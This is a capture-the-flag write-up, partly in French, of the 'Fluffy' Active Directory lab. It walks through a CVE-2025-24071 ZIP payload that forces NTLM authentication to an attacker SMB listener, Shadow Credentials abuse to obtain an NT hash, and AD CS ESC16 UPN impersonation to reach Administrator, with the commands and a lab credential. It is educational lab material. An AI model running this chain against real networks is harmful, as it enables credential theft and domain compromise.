01 - Environment & Scope

Environment & Scope

Fluffy exposes a single Windows Domain Controller externally. The provided credential j.fleischman:J0elTHEM4n1990! is not a shell by itself, but it is enough to enumerate SMB shares and write to the IT share. That share is the opening. It contains a PDF warning the IT department about several 2025 vulnerabilities, and one of them gives us a way to coerce a second domain user into authenticating to our SMB listener.

05 - Payload Creation

CVE-2025-24071 Payload

Comment fonctionne CVE-2025-24071

Les fichiers .library-ms sont des descripteurs XML utilisés par l'Explorateur Windows pour définir des bibliothèques virtuelles (Documents, Musique…). Ils contiennent des balises <url> qui pointent vers des emplacements de stockage - locaux ou réseau.

La vulnérabilité réside dans la façon dont Windows Shell parse ces fichiers : lors de l'extraction d'une archive ZIP contenant un .library-ms, l'explorateur résout automatiquement les URLs déclarées pour découvrir le contenu de la bibliothèque. Si l'URL pointe vers un chemin UNC (\\attacker\share), Windows initie une connexion SMB vers l'attaquant et envoie un challenge-response NetNTLMv2 - sans que l'utilisateur ouvre le fichier. La simple extraction suffit.

La chaîne de déclenchement complète :

utilisateur (ou service) extrait exploit.zip └─▶ Windows Shell parse fluffy.ms-library └─▶ résolution de <url>\\10.10.14.241\share └─▶ connexion SMB sortante vers l'attaquant └─▶ NetNTLMv2 capturé par Responder
What pointed us here Writable share + CVE-2025-24071 listed as critical. Generate a malicious archive pointing back to our attacker SMB listener, upload it to the IT share. 
python3 poc.py

Enter your file name: fluffy.ms-library
Enter IP (EX: 192.168.1.162): 10.10.14.241
completed
smbclient //10.129.31.202/IT \
  -U 'fluffy.htb/j.fleischman%J0elTHEM4n1990!' \
  -c 'put exploit.zip'

08 - AD Enumeration

LDAP Enumeration

What pointed us here p.agila belonged to Service Account Managers, a group with enough control to add members to Service Accounts. That relationship became the bridge to Shadow Credentials. 
bloodyAD --host 10.129.31.202 -d fluffy.htb \
  -u 'p.agila' -p '[redacted]' \
  get object winrm_svc

distinguishedName: CN=winrm service,CN=Users,DC=fluffy,DC=htb
displayName: winrm service
memberOf: CN=Service Accounts,CN=Users,DC=fluffy,DC=htb
         CN=Remote Management Users,CN=Builtin,DC=fluffy,DC=htb
sAMAccountName: winrm_svc
servicePrincipalName: WINRM/winrm.fluffy.htb
userPrincipalName: winrm_svc@fluffy.htb
userAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD

Two attributes matter: winrm_svc is a service account in Remote Management Users. If we obtain its hash, WinRM gives us a user shell. A password reset attempt failed - the path is certificate-based takeover instead.

GenericWrite & self-membership - pourquoi ça fonctionne

Dans Active Directory, les ACL d'un objet groupe peuvent accorder le droit Self-Membership (ou plus généralement GenericWrite) à un autre groupe. Ici, les membres de Service Account Managers ont Self-Membership sur Service Accounts : chaque membre peut s'ajouter lui-même au groupe cible sans droits d'administration.

La conséquence en cascade :

  • Service Account Managers → droit Self-Membership sur Service Accounts
  • Service Accounts → droit GenericWrite sur les objets compte de service (winrm_svc, ca_svc)
  • GenericWrite sur un compte → écriture de l'attribut msDS-KeyCredentialLink → Shadow Credentials

GenericWrite ne donne pas l'écriture directe sur unicodePwd (le hash NT), mais il ouvre assez d'attributs pour compromettre le compte autrement, via l'ajout d'un credential de clé publique ou la modification du SPN.

p.agila ∈ Service Account Managers │ Self-Membership ▼ Service Accounts ──(p.agila s'y ajoute)──▶ p.agila ∈ Service Accounts │ GenericWrite sur objets du groupe ▼ winrm_svc / ca_svc │ msDS-KeyCredentialLink writable ▼ Shadow Credentials → NT hash
09 - Account Takeover

Shadow Credentials to winrm_svc

What pointed us here p.agila could add itself to Service Accounts. Shadow Credentials required that group membership first - the initial write attempt failed with insufficient rights until the group was joined.
Shadow Credentials - mécanisme

L'attribut msDS-KeyCredentialLink a été introduit pour Windows Hello for Business et le Device Trust model. Il stocke des Key Credentials : des structures contenant une clé publique RSA et des métadonnées (device ID, date de création…). Quand un compte possède une entrée dans cet attribut, le KDC accepte une authentification PKINIT utilisant la clé privée correspondante - en lieu et place du mot de passe.

Si on dispose d'un droit d'écriture sur msDS-KeyCredentialLink d'un compte cible :

  • On génère une paire de clés RSA (Certipy s'en charge)
  • On écrit la clé publique dans msDS-KeyCredentialLink du compte cible
  • On s'authentifie via PKINIT avec la clé privée → le KDC valide la clé publique stockée et émet un TGT
  • Le TGT contient un PAC chiffré incluant des données que Certipy utilise via U2U (User-to-User) pour récupérer le hash NT - sans jamais toucher au mot de passe du compte

L'opération est réversible et furtive : l'entrée peut être supprimée après usage, le mot de passe du compte n'a pas changé, et aucun événement de changement de mot de passe n'est journalisé.

Attaquant (possède GenericWrite sur winrm_svc) │ ├─ génère keypair (pub/priv) ├─ écrit pub → msDS-KeyCredentialLink de winrm_svc │ └─▶ certipy auth -pfx winrm_svc.pfx │ PKINIT AS-REQ (signé avec clé privée) ▼ KDC vérifie la clé publique dans msDS-KeyCredentialLink │ TGT émis ▼ certipy U2U → récupère NT hash de winrm_svc │ └─▶ Pass-the-Hash → WinRM

Prérequis côté DC : le domaine doit être au niveau fonctionnel 2016+ et les DC doivent supporter PKINIT. Pratiquement universel sur les infrastructures modernes.

Clock skew - faketime shell required The auto mode reached PKINIT but failed with KRB_AP_ERR_SKEW. The fix was to split the operation: write the Shadow Credential with shadow add, open a faketime shell adjusted to the DC time, then run certipy auth from inside it.

faketime "$(date -d '+7 hours' '+%Y-%m-%d %H:%M:%S')" zsh

12 - Privilege Escalation

AD CS ESC16 to Administrator

What pointed us here Certipy found ESC16: the CA security extension is disabled. Without the object SID extension, certificates are not strongly bound to an AD object. With write access to ca_svc's UPN, we can temporarily impersonate Administrator and request a certificate under that identity.
AD CS ESC16 - l'extension de sécurité et son absence

Depuis une mise à jour de mai 2022 (KB5014754), les DC Windows embarquent dans chaque certificat émis une extension propriétaire Microsoft identifiée par l'OID 1.3.6.1.4.1.311.25.2 (szOID_NTDS_CA_SECURITY_EXT). Cette extension contient le SID de l'objet AD qui a effectué la demande de certificat.

Lors de l'authentification PKINIT avec ce certificat, le KDC utilise le SID embarqué pour identifier le compte - et non la valeur du SAN UPN (Subject Alternative Name). Changer l'UPN d'un compte avant la demande de certificat ne sert donc à rien si l'extension est active : le SID réel de ca_svc sera toujours présent dans le certificat, et le KDC mappera vers ca_svc, pas vers Administrator.

ESC16 : la CA a désactivé cette extension. Le certificat émis ne contient pas de SID. Le KDC tombe en repli sur le mapping UPN : il résout le SAN UPN du certificat contre l'annuaire AD pour trouver le compte correspondant. Si l'UPN du certificat vaut administrator, le KDC cherche un objet dont l'UPN est administrator et l'authentifie comme tel.

Les conditions nécessaires pour exploiter ESC16 :

  • L'extension szOID_NTDS_CA_SECURITY_EXT est désactivée sur la CA
  • On contrôle un compte ayant le droit d'enrôlement sur un template accessible (ici Cert Publishers peut enrôler sur le template User)
  • On dispose d'un droit d'écriture sur l'UPN (userPrincipalName) du compte enrôleur - ici winrm_svc a GenericWrite sur ca_svc
État normal (extension active) ┌────────────────────────────────────────────────────────┐ │ Certificat émis contient : │ │ SAN UPN : administrator │ │ SID ext : S-1-5-21-...-1103 (SID réel de ca_svc) │ │ │ │ KDC utilise le SID → authentifie ca_svc [blocked] │ └────────────────────────────────────────────────────────┘ ESC16 (extension désactivée) ┌────────────────────────────────────────────────────────┐ │ Certificat émis contient : │ │ SAN UPN : administrator │ │ SID ext : (absente) │ │ │ │ KDC cherche UPN = administrator → authentifie Admin [ok] │ └────────────────────────────────────────────────────────┘ Flux d'attaque ① winrm_svc écrit UPN de ca_svc → "administrator" ② ca_svc enrôle un certificat User → CA émet cert(SAN UPN=administrator, pas de SID) ③ winrm_svc restaure l'UPN de ca_svc → "ca_svc@fluffy.htb" ④ certipy auth administrator.pfx → PKINIT → KDC mappe sur Administrator → TGT Administrator + NT hash

La restauration de l'UPN (étape ③) est critique : la laisser à administrator casserait l'authentification de ca_svc dans l'annuaire et créerait un conflit d'UPN visible dans les logs.

15 - Lessons

Key Takeaways

Concept Lesson
Writable shares A writable internal share is not just storage. Treat it as a delivery mechanism for coercion, parser bugs, file handlers, indexers, and admin workflows.
Patch notices Internal patch documents often reveal exactly which vulnerability family the machine expects you to investigate. The CVE list narrowed the attack path immediately.
NetNTLMv2 SMB signing prevented relay but not offline cracking. A weak password still compromises a captured NetNTLMv2 response.
Clock skew Kerberos requires time alignment. PKINIT fails with KRB_AP_ERR_SKEW until the command runs in a faketime-adjusted shell matching the DC.
Shadow Credentials Write access to msDS-KeyCredentialLink on a user → add a certificate credential → PKINIT → NT hash, without touching the account password.
Certipy -hashes vs -p Use -hashes :NThash for hash auth. Passing a hash with -p treats it as a literal password and fails with invalidCredentials.
Remote Management Users Always check service account group membership. winrm_svc was valuable precisely because it had an explicit WinRM login grant.
ESC16 Disabling the AD CS security extension removes SID binding. Combined with UPN write access and enrollment rights, this becomes a direct Administrator mapping primitive.
